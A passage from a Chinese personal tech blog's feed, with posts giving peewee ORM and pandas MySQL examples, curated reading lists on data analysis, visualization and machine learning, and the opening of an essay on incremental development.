&lt;h1 id="peewee"&gt;&lt;a href="https://github.com/coleifer/peewee"&gt;peewee&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;a small, expressive orm -- supports postgresql, mysql and sqlite&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用习惯和django orm很像&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# http://docs.peewee-orm.com/en/latest/peewee/example.html&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;peewee&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;

&lt;span class="n"&gt;mysql_db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLDatabase&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;yunfan&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8mb4&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#CREATE DATABASE `yunfan` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;  创建数据库使用utf-8 否则有编码问题&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;QiniuStore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;course_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#key是关键字&lt;/span&gt;
    &lt;span class="n"&gt;file_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;filesize&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#endUser = Column(String(100),nullable=True)&lt;/span&gt;
    &lt;span class="n"&gt;create_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DateTimeField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Meta&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;database&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mysql_db&lt;/span&gt;
        &lt;span class="n"&gt;order_by&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-create_time&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;mysql_db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;mysql_db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_tables&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;QiniuStore&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id="pandas"&gt;pandas&lt;/h1&gt;
&lt;p&gt;pandas的DataFrame大多时候也用来容纳二维数据，像一张&lt;code&gt;表&lt;/code&gt;,所以易于与数据库打交道&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#Pandas读取Mysql数据&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pandas&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;pd&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;MySQLdb&lt;/span&gt;
&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3306&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#df = pd.read_sql(&amp;#39;select * from auth_user limit 100;&amp;#39;, con=mysql_cn)  &lt;/span&gt;
&lt;span class="n"&gt;df&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read_sql&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;select * from auth_user limit 10;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;con&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Read SQL query into a DataFrame ,之后可以使用pandas的查询和绘图统计功能&lt;/p&gt;
&lt;p&gt;参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/u011715678/article/details/48497291"&gt;利用Python 的 Pandas进行数据分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pandas.pydata.org/pandas-docs/stable/comparison_with_sql.html"&gt;comparison_with_sql&lt;/a&gt;: pd与sql比较&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_5"&gt;心得&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;数据库的重点是表，操作可以用python方法，为了查询的灵活，还是需要sql&lt;/li&gt;
&lt;li&gt;用好ORM的前提是了解关系数据库的概念和典型用例&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_6"&gt;理解&lt;/h3&gt;
&lt;p&gt;数据库表是一个二维表，包含多行多列。把一个表的内容用Python的数据结构表示出来的话，可以用一个list表示多行，list的每一个元素是tuple，表示一行记录&lt;/p&gt;
&lt;p&gt;行，想象为二维数据(csv),外键是一种关系  &lt;/p&gt;
&lt;h3 id="_7"&gt;通用技能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多维数据的可视化 （降维）是一个常见的问题模式 。如何聚合，pandas部分&lt;/li&gt;
&lt;li&gt;帆船项目 帮助理解pandas如何用于web流&lt;ul&gt;
&lt;li&gt;如何实时读取sql，这样一来oricle问题就解决了 可视化问题&lt;/li&gt;
&lt;li&gt;从真实数据学习数据图表化的原理  《网站分析》&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;投资技能 pandas -&amp;gt; scikit-learn   &lt;/li&gt;
&lt;li&gt;edx的log先导入数据库  保留关系 然后变为扁平化数据  &lt;ul&gt;
&lt;li&gt;将log导入数据库是为了获得强大的查询能力  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对sql的使用场景要有所了解  适合作什么&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_8"&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/SQLAlchemy"&gt;SQLAlchemy 维基百科&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0014021031294178f993c85204e4d1b81ab032070641ce5000"&gt;使用SQLAlchemy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://forta.com/books/0672336073/"&gt;SQL必知必会 源码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/e6bba189fcbd"&gt;SQLAlchemy 简单笔记&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 03 May 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-05-03:relational-database-summary.html</guid><category>code</category></item><item><title>数据分析和可视化(我的学习资料)</title><link>/Data-analysis-and-visualization.html</link><description>&lt;p&gt;对数据分析和可视化这块一直兴趣满满，保持关注，搜集了一些不错的资料，整理分享给大家&lt;/p&gt;
&lt;p&gt;语言层面，我主要在关注Python和JavaScript，所以资料可能多与这两门语言有关&lt;/p&gt;
&lt;hr /&gt;
&lt;h1 id="_1"&gt;优秀文章(入门引导)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/89674/"&gt;The Log：每个程序员都应该知道有关实时数据的统一抽象（1）概念&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.oschina.net/translate/log-what-every-software-engineer-should-know-about-real-time-datas-unifying"&gt;日志：每个软件工程师都应该知道的有关实时数据的统一概念&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/80981/"&gt;数据科学的完整学习路径（Python版）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/81133/"&gt;Python数据分析入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/80853/"&gt;Python和数据科学的起步指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_2"&gt;公共数据源&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/caesar0301/awesome-public-datasets"&gt;awesome-public-datasets&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中我们可以看到香港公开的数据：&lt;a href="https://data.gov.hk/sc"&gt;data.gov.hk&lt;/a&gt;&lt;/p&gt;
&lt;h1 id="python"&gt;Python&lt;/h1&gt;
&lt;h3 id="ipython-notebook"&gt;ipython notebook&lt;/h3&gt;
&lt;p&gt;我喜欢使用ipython notebook（现在改名为jupyter）来探索数据，这是个值得一学的神器，可以看看我此前写的文章：&lt;a href="http://blog.just4fun.site/use-ipython-notebook.html"&gt;使用IPython Notebook来学习编程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用ipython notebook来探索数据有许多好处，其中的一点是可以轻易分享经验和成果，现在有许多教程是基于它的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/DrSkippy/Data-Science-45min-Intros"&gt;Data-Science-45min-Intros&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/jrjohansson/scientific-python-lectures/tree/master/"&gt;scientific-python-lectures&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/data-science-ipython-notebooks"&gt;data-science-ipython-notebooks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/interactive-coding-challenges"&gt;interactive-coding-challenges&lt;/a&gt;:这个主要是算法&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cloga/scipy-lecture-notes_cn"&gt;Pytho科学计算生态的介绍的中文翻译&lt;/a&gt;-&lt;a href="https://github.com/cloga/scipy-lecture-notes_cn"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="pandas"&gt;&lt;a href="https://github.com/pydata/pandas"&gt;pandas&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jvns/pandas-cookbook"&gt;pandas-cookbook&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/jvns/pandas-cookbook/tree/master/cookbook/"&gt;http://nbviewer.jupyter.org/&lt;/a&gt;:从这里快速上手&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/Zhihu_bigdata"&gt;Zhihu_bigdata&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;相关工具&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/robdmc/pandashells"&gt;pandashells&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ipython/ipython/wiki/A-gallery-of-interesting-IPython-Notebooks#pandas-for-data-analysis"&gt;Pandas for data analysis&lt;/a&gt; :ipynb&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pandas-dev/pandas/blob/master/doc/cheatsheet/Pandas_Cheat_Sheet.pdf"&gt;Pandas Cheat Sheet&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="javascript"&gt;JavaScript&lt;/h1&gt;
&lt;h3 id="d3"&gt;&lt;a href="https://github.com/mbostock/d3"&gt;d3&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mbostock/d3/wiki/Gallery"&gt;案例展示&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ourd3js.com/wordpress/?cat=2"&gt;D3 入门系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;一些建议：&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/22171866"&gt;学习d3js有没有一个系统的学习方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/38648735"&gt;如何评价 D3.js这个框架？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/c3800c61d2fb"&gt;D3.js入门指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_3"&gt;在线学习&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/datasciencemasters/go"&gt;The Open Source Data Science Masters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dataquest.io/"&gt;dataquest&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_4"&gt;博客&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rushter/data-science-blogs"&gt;data-science-blogs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_5"&gt;真实项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rhiever/Data-Analysis-and-Machine-Learning-Projects"&gt;Data-Analysis-and-Machine-Learning-Projects&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_6"&gt;知乎问答&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/29265587"&gt;如何快速成为数据分析师？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_7"&gt;资料集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/okulbilisim/awesome-datascience"&gt;awesome-datascience&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_8"&gt;一些好书&lt;/h1&gt;
&lt;h3 id="_9"&gt;数据挖掘概念&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://book.douban.com/subject/5377669/"&gt;数据挖掘导论&lt;/a&gt;
&lt;a href="http://book.douban.com/subject/11542972/"&gt;数据挖掘:概念与技术&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="_10"&gt;统计学&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/7056708/"&gt;深入浅出统计学&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/10590856/"&gt;统计学习方法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="python_1"&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://book.douban.com/subject/25779298/"&gt;利用Python进行数据分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_11"&gt;数据库&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/24250054/"&gt;SQL必知必会&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3354490/"&gt;MySQL必知必会&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_12"&gt;机器学习&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3288908/"&gt;集体智慧编程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/24703171/"&gt;机器学习实战&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_13"&gt;其他入门好书&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/6862061/"&gt;计算机科学概论（第11版）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3040870/"&gt;Head First HTML与CSS、XHTML&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 16 Feb 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-02-16:Data-analysis-and-visualization.html</guid><category>dev-tools</category></item><item><title>机器学习与人工智能(我的学习资料)</title><link>/machine-leanring-and-ai.html</link><description>&lt;h1 id="_1"&gt;我的兴趣点(目前)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;作诗机&lt;/li&gt;
&lt;li&gt;人工智能&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_2"&gt;策略&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;通过折腾来学习，先把它当做黑盒，关注输入和输出，使用增量法探索，同时阅读统计学和相关工具&lt;/li&gt;
&lt;li&gt;基于ipython notebook来探索&lt;/li&gt;
&lt;li&gt;coursera：&lt;a href="https://www.coursera.org/learn/machine-learning/"&gt;机器学习&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;统计学基础：《深入浅出统计学》&lt;/li&gt;
&lt;li&gt;《神经网络与深度学习讲义》（已粗看一遍）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_3"&gt;入门文章&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/67616/"&gt;有趣的机器学习：最简明入门指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/50338/"&gt;如何向外行解释机器学习和数据挖掘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.almosthuman.cn/2016/01/23/koarh/"&gt;神经网络和深度学习简史&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_4"&gt;学习路径&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/hangtwenty/dive-into-machine-learning"&gt;dive-into-machine-learning&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="scikit-learn"&gt;&lt;a href="https://github.com/scikit-learn/scikit-learn"&gt;scikit-learn&lt;/a&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/81721/"&gt;基于 Python 和 Scikit-Learn 的机器学习介绍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://segmentfault.com/a/1190000002672062"&gt;机器学习探索之路1：机器学习相关工具介绍与安装&lt;/a&gt;:选择anaconda！&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gmonce/scikit-learn-book"&gt;scikit-learn-book&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/justmarkham/scikit-learn-videos"&gt;scikit-learn-videos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.xgezhang.com/scikit_learn_ml_translation.html"&gt;Scikit-Learn机器学习介绍（中文翻译）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://muxuezi.github.io/categories/scikit-learn-cookbook.html"&gt;Posts about scikit-learn cookbook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="mooc"&gt;mooc&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.coursera.org/learn/machine-learning/"&gt;机器学习&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_5"&gt;资料集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ty4z2008/Qix/blob/master/dl.md"&gt;机器学习(Machine Learning)&amp;amp;深度学习(Deep Learning)资料(Chapter 1)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/56256/"&gt;机器学习的最佳入门学习资源&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/73806/"&gt;国外程序员整理的机器学习资源大全&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_6"&gt;知乎问答&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36768514/answer/81937823"&gt;有没有必要把机器学习算法自己实现一遍？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/22553761"&gt;如何简单形象又有趣地讲解神经网络是什么？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_7"&gt;有趣的项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://fuzhii.com/2016/01/16/redmansions/"&gt;用机器学习的方法鉴别红楼梦作者&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36853910"&gt;GitHub 上有哪些有趣的关于 NLP 或者 DL 的项目&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_8"&gt;图像相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/deepdream"&gt;deepdream&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jcjohnson/neural-style"&gt;neural-style&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/alexjc/neural-doodle"&gt;neural-doodle&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_9"&gt;高性能平台&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/tensorflow/tensorflow"&gt;tensorflow&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/aymericdamien/TensorFlow-Examples"&gt;TensorFlow-Examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tflearn/tflearn"&gt;tflearn&lt;/a&gt;:Deep learning library featuring a higher-level API for TensorFlow&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jtoy/awesome-tensorflow"&gt;awesome-tensorflow&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tensorflow/skflow"&gt;skflow&lt;/a&gt;:Simplified interface for TensorFlow (mimicking Scikit Learn) for Deep Learning&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Theano/Theano"&gt;Theano&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 16 Feb 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-02-16:machine-leanring-and-ai.html</guid><category>dev-tools</category></item><item><title>关于增量式开发</title><link>/about-incremental-development.html</link><description>&lt;p&gt;增量式开发是我最喜欢的开发方式之一。&lt;/p&gt;
&lt;h2 id="1"&gt;1&lt;/h2&gt;
&lt;p&gt;在读《The Django Book》时，十分震惊,技术书籍居然可以写得这般清晰，清晰如阳光照射下，清水中的鹅软石。技术类书籍中好书是向来不缺的，对新手友好的书却也并不多见。《The Django Book》算是其一，后来我再翻这本书，想它为何能把知识说得这般清晰，发现书中讲解知识的方式是&lt;code&gt;增量式&lt;/code&gt;的：每次的讲解的内容都尽量做到只包含主题相关部分，基本不添加额外的知识干扰（打击）你，即便有些不可避免的后向引用，也会明确告诉你它的作用是啥，你目前只要把它当成黑盒就行。每一段程序都尽可能简易简短，每一节都在上一节基础上加上一点新东西，这样学起来真如读小说一般连贯有趣。如果哪里不懂，基本可以确定，不懂部分就是这节多出的知识。&lt;/p&gt;
&lt;h2 id="2"&gt;2&lt;/h2&gt;
&lt;p&gt;《代码大全》里，在谈论隐喻部分时作者说道&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;增量设计 / 构造 / 测试是软件开发的最强有力工具之一&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
